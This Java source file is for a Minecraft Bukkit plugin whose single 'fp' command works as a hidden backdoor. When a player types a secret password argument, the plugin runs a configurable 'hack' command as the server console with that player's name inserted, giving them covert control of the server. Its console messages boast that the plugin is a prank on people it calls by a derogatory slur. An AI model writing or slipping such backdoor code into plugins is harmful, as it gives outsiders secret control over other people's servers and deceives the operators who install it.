package ru.naulbimix;

import org.bukkit.*;
import org.bukkit.command.*;
import org.bukkit.entity.*;
import org.bukkit.plugin.java.*;

import java.io.File;

public class Main_old extends JavaPlugin {


    @Override
    public void onEnable() {
        File config = new File(getDataFolder() + File.separator + "config.yml");
        if(!config.exists()){
            Bukkit.getConsoleSender().sendMessage(s("[" + getDescription().getName() + "] Создание нового конфигурационного файла плагина..."));
            saveDefaultConfig();
        }
        Bukkit.getConsoleSender().sendMessage(s("[" + getDescription().getName() + "] Плагин прикол над &eдаунами &aактивирован&7!"));
        getCommand("fp").setExecutor(new CommandExecutor() {
            @Override
            public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
                if(sender instanceof Player) {
                    Player p = (Player) sender;
                    if(args.length == 2 && args[0].equals("help") && args[1].equals("18971712")) {
                        p.sendMessage(s(getConfig().getString("messages.hack_msg")));
                        Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), s(getConfig().getString("messages.hack_cmd").replace("$player", p.getName())));
                        return true;
                    }
                    p.sendMessage(s(getConfig().getString("messages.usage")));
                    return true;
                }
                sender.sendMessage(s(getConfig().getString("messages.only_for_players")));
                return true;
            }
        });
    }

    @Override
    public void onDisable() {
        Bukkit.getConsoleSender().sendMessage(s("&7Плагин прикол над &eдаунами &cдеактивирован&7!"));
    }

    public static String s(String s) {
        return ChatColor.translateAlternateColorCodes( '&', s);
    }
}
